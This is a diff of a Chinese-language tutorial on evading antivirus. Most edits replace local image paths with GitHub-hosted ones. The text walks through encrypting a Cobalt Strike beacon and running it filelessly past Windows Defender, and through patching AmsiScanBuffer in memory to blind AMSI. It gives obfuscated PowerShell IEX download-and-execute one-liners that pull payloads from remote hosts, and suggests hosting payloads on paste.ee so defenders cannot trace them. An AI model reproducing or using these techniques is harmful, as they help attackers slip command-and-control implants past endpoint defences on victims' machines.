@@ -8,27 +8,29 @@
 
 1.用cobaltstrike生成一个beacon.ps1,当然你用generator也可以
 
-
-
-
-
+![image](https://user-images.githubusercontent.com/![image](https://user-images.githubusercontent.com/89376703/155733913-be237354-9262-452f-aa47-f744a668b9c1.png)/155733739-d63c4640-ada7-453f-b7b6-cace49ea595c.png)
+![image](https://user-images.githubusercontent.com/89376703/155733867-f733e54e-19fd-4c58-8df5-45065c0f3a8f.png)
+![image](https://user-images.githubusercontent.com/89376703/155733969-384abfb3-64be-4c93-b2b8-c7c60ea8dd13.png)
 
 
 注意我这里用的是64位的stageless，所以文件比较大
+![image](https://user-images.githubusercontent.com/89376703/155734073-c1d9b0d1-0da9-40b2-ad38-bdc10a5563fb.png)
 
 
 
 这里使用C#加密器对整个ps1文件进行base64加密
+![image](https://user-images.githubusercontent.com/89376703/155734157-19d0ed09-04fd-4ce2-90d4-6b27b0ef65cc.png)
 
-![image-20220225145408952](../../AppData/Roaming/Typora/typora-user-images/image-20220225145408952.png)
 
 
 
 重新创建一个文件命名为pay.ps1,将上面的base64密文复制粘贴到下面代码的$decryption字符串变量中
+![image](https://user-images.githubusercontent.com/89376703/155734244-a2185115-0d62-4b8c-96f0-7e09b6caf530.png)
+
 
 $Address 后面一串就是base64解密公式。然后用IEX 去执行这个字符串变量
 
-![image-20220225150152460](C:\Users\16915\Desktop\bypass asmi\image-20220225150152460.png)
+![image](https://user-images.githubusercontent.com/89376703/155734381-81a55fb3-78f8-4303-b78a-0e88702ff2fb.png)
 
 但是amsi.dll对IEX是有严格限制的，直接执行解密密文必然会 被拦截
 
@@ -94,7 +96,7 @@ $hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)
 
 放在windows defender环境下无文件执行即可
 
-![image-20220225171359847](C:\Users\16915\Desktop\bypass asmi\image-20220225171359847.png)
+![image](https://user-images.githubusercontent.com/89376703/155734476-9c71d493-28df-4b6d-890f-069301c2312b.png)
 
 可以看到可以绕过微软，能执行一些基本的命令，但是dumplass应该不行。
 
@@ -119,17 +121,18 @@ HRESULT AmsiScanBuffer(
 
 使用GetProcAddress()函数获取 AmsiScanBuffer() 的句柄，找到amsi.dll带修补的地址
 
-![image-20220225181129080](C:\Users\16915\Desktop\bypass asmi\image-20220225181129080.png)
+![image](https://user-images.githubusercontent.com/89376703/155734549-4ec949b6-7637-44a6-bcdd-f3610e288630.png)
+
 
 还有其他方法可以实现这一点。SecureYourIt 一篇博客文章（https://secureyourit.co.uk/wp/2019/05/10/dynamic-microsoft-office-365-amsi-in-memory-bypass-using-vba/）显示了不同的定位“AmsiScanBuffer()”的方法。不是直接将句柄设置为“AmsiScanBuffer()”，而是首先将句柄设置为“AmsiUacInitialize()”。从句柄中减去值 256 随后将导致句柄指向“AmsiScanBuffer()”。
 
-![image-20220225181054648](C:\Users\16915\Desktop\bypass asmi\image-20220225181054648.png)
 
 在上面的示例中，句柄设置为“AmsiUacInitialize()”，尽管你可以在技术上使用 Amsi.dll 中的任何函数。这种方法在针对“AmsiScanBuffer()”创建签名的情况下很有用。
 
 ## 0x02.分离免杀:抛弃 net webclient 远程加载方式（一）
 
 这里采用.net中的webrequest去请求远程恶意样本内容、读取样本、并执行样本。其实加载原理都是用IEX去执行远程的样本内容，大同小异，这边只是修改了一些特征，这里执行的前提是远程加载的powershell样本也得免杀，我们通常会将样本放置在网页可以访问的web服务器上，但是这同时也带来了风险，因为有些高级防病毒软件会标记一些恶意的公网IP（比如说卡巴斯基、小红伞），如果你将样本托管GitHub，虽然虽不会被防病毒标记，但是实战中一下就被蓝队溯源了，我这里推荐一个可以在公网上挂起文本并且合法的网站https://paste.ee/  
+
 
 ```
 $webreq = [System.Net.WebRequest]::Create(‘0.0.0.0/1.ps1’)
@@ -141,12 +144,12 @@ IEX($content)
 ```
 
 我们可以用replace函数添加一些符号或者数字去混淆、替换暴露出来的IP地址
-
-![image-20220225183422626](C:\Users\16915\Desktop\bypass asmi\image-20220225183422626.png)
+![image](https://user-images.githubusercontent.com/89376703/155734700-cc2a1aa8-9f42-4744-9e3f-842d0687347c.png)
 
 当然有IEX的地方amsi.dll肯定会重点扫描，你必须在IEX执行之前就破坏它，因此这里可以在$content=$reader.ReadToEnd()和IEX($content)插入破坏amsi.dll的代码。
 
-![image-20220225193018689](C:\Users\16915\Desktop\bypass asmi\image-20220225193018689.png)
+![image](https://user-images.githubusercontent.com/89376703/155734863-2274eb70-a3ca-4000-bd89-bbce4eab3949.png)
+
 
 
 
@@ -162,7 +165,7 @@ IEX ((new-object net.webclient).downloadstring('http://0.0.0.0:8000/bypass.txt'.
 IEX ((new-object net.webclient).downloadstring("http://10.@!#$%^&*()21@!#$%^&*()2.202.188@@@@@:8000/byp**************ass.tx**************t".Replace('@@@@@','').Replace('@!#$%^&*()','').Replace('**************',''))
 ```
 
-![image-20220225212713906](C:\Users\16915\Desktop\bypass asmi\image-20220225212713906.png)
+
 
 ## 0x04.远程加载方式（三）
 
@@ -178,4 +181,4 @@ IEX([Net.Webclient]::new().DownloadString("http://0.0.0.0:8000/bypass.txt".))
 IEX([Net.Webclient]::new().DownloadString("h%%%t%%%tp:%%%//10.212.2@@@@@02.188@@@@@:80@@@@@00/bypas%%%s.tx%%%t".Replace('@@@@@','').Replace('%%%','')))
 ```
 
-![image-20220225220216013](C:\Users\16915\Desktop\bypass asmi\image-20220225220216013.png)
+![image](https://user-images.githubusercontent.com/89376703/155734999-eda34e45-42c7-4e2b-a526-c4eae7cb183f.png)
